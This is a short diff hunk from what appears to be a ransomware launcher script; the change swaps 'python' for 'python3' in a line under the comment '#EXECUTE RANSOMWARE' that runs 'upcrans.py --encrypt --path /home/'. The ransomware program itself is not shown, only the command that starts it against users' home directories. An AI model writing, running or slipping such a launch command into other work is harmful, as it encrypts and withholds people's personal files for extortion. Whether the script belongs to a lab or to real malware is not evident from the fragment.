@@ -32,7 +32,7 @@ done
 
 #EXECUTE RANSOMWARE
 echo "server up"
-python upcrans.py --encrypt --path /home/
+python3 upcrans.py --encrypt --path /home/
 
 
 #EXECUTE INTERFACE
